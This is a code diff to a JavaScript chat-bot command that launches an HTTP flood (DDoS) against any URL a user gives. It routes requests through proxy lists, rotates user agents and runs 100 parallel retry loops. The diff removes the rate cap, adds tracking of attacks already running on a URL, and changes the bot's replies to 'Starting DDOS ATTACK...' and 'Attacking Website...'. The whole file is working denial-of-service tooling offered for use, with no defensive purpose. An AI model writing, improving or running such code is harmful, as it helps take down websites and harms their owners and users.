@@ -66,14 +66,14 @@ const acceptHeaders = [
 const proxyFilePath = path.join(__dirname, "proxy.txt");
 const ualist = path.join(__dirname, "ua.txt");
 const maxRequests = Number.MAX_SAFE_INTEGER;
-const requestsPerSecond = 1000000;
+const requestsPerSecond = Number.MAX_SAFE_INTEGER;
 const numThreads = 100;
 
 const getRandomElement = (arr) => arr[Math.floor(Math.random() * arr.length)];
 
 const sanitizeUA = (userAgent) => {
     return userAgent.replace(/[^\x20-\x7E]/g, "");
-}
+};
 
 const userAgents = () => {
     try {
@@ -83,7 +83,7 @@ const userAgents = () => {
         console.error(`Failed to read user agent list: ${error}`);
         return [];
     }
-}
+};
 
 const loadProxies = () => {
     try {
@@ -92,6 +92,8 @@ const loadProxies = () => {
         return [];
     }
 };
+
+const activeAttacks = new Map();
 
 const performAttack = (url, agent, headers, continueAttack, onComplete) => {
     if (!continueAttack) return;
@@ -111,17 +113,16 @@ const performAttack = (url, agent, headers, continueAttack, onComplete) => {
     axios.get(url, {
         httpAgent: agent || null,
         headers: headersForRequest,
-        timeout: 0
+        timeout: 0,
     })
     .then(() => setTimeout(() => performAttack(url, agent, headers, continueAttack, onComplete), 0))
     .catch((err) => {
         if (err.response?.status === 503) {
-            console.log("Target under heavy load (503).");
+            console.error("Target under heavy load (503).");
         } else if (err.response?.status === 502) {
-            console.log("Error: Bad Gateway (502).");
-        } else {
-            console.log("Request error: " + err.message);
-        }
+            console.error("Bad Gateway (502).");
+        } else if (err.response?.status === 403) return;
+        console.error("DDOS OTHER STATUS" + err.message);
         setTimeout(() => performAttack(url, agent, headers, continueAttack, onComplete), 0);
     });
 };
@@ -129,12 +130,16 @@ const performAttack = (url, agent, headers, continueAttack, onComplete) => {
 module.exports["run"] = async ({
     args,
     chat,
-    font
+    font,
 }) => {
     const targetUrl = args[0];
 
     if (!targetUrl || !/^https?:\/\//.test(targetUrl)) {
         return chat.reply(font.thin("Invalid URL. Please enter a valid URL starting with http:// or https://"));
+    }
+
+    if (activeAttacks.has(targetUrl)) {
+        return chat.reply(font.thin("An attack on this URL is already in progress. Wait for it to finish before starting another."));
     }
 
     const proxies = loadProxies();
@@ -143,11 +148,13 @@ module.exports["run"] = async ({
     }
 
     let continueAttack = true;
+    activeAttacks.set(targetUrl, true); 
     await chat.reply(font.thin("Starting DDOS ATTACK..."));
 
     const attackTimeout = setTimeout(() => {
         continueAttack = false;
-        chat.reply(font.thin("Max flood requests reached. Attack stopped."));
+        activeAttacks.delete(targetUrl);
+        chat.reply(font.thin("Max flood requests Initiated. Attacking Website..."));
     }, (maxRequests / requestsPerSecond) * 1000);
 
     for (let i = 0; i < numThreads && continueAttack; i++) {
@@ -164,6 +171,7 @@ module.exports["run"] = async ({
         performAttack(targetUrl, agent, null, continueAttack, () => {
             if (!continueAttack) {
                 clearTimeout(attackTimeout);
+                activeAttacks.delete(targetUrl);
             }
         });
     }
